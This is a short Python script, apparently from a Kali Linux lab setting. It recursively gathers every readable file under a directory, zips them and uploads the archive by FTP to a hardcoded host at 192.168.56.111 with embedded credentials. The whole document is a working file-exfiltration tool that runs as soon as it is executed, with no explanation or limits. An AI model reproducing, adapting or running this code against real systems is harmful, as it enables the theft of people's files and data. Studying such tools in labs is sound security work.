import os
from ftplib import FTP
from typing import List
from zipfile import ZipFile


base_directory: str = "/home/kali/Downloads"
zip_name: str = "home.zip"
ftp_host: str = "192.168.56.111"
ftp_user: str = "user"
ftp_password: str = "tttttt"


def get_all_readable_files(base_directory: str) -> List[str]:
    directories: List[str] = [base_directory]
    readable_files: List[str] = []

    def is_directory_list_empty(directories: list) -> bool:
        return len(directories) == 0

    while not is_directory_list_empty(directories):
        dir: str = directories.pop()
        results = list(os.scandir(dir))

        directories.extend(
            result.path
            for result in results
            if result.is_dir(follow_symlinks=False) and os.access(result.path, os.R_OK)
        )
        readable_files.extend(
            result.path
            for result in results
            if result.is_file(follow_symlinks=False) and os.access(result.path, os.R_OK)
        )

    return readable_files


def zip_files(zip_name: str, files: List[str]):
    with ZipFile(zip_name, 'w') as zip:
        for file in files: zip.write(file)


def send_ftp(host: str, user: str, password: str, archive: str):
    with FTP(host, user, password) as ftp, open(archive, 'rb') as f:
        ftp.storbinary(f"STOR {archive}", f)


files = get_all_readable_files(base_directory)
zip_files(zip_name, files)
send_ftp(ftp_host, ftp_user, ftp_password, zip_name)

